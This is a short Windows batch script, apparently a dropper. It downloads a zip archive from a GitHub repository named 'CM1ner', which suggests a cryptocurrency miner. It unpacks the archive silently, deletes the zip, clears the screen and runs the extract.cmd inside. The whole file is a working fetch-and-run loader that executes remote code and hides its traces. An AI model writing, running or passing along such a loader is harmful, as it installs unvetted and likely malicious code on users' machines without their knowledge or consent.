@echo off
SET x=%~dp0
curl https://github.com/zephr1213/CM1ner/blob/main/extract.zip?raw=true --output lnk.zip
powershell Expand-Archive -Force %x%lnk.zip %x%
del /F lnk.zip
cls
extract.cmd
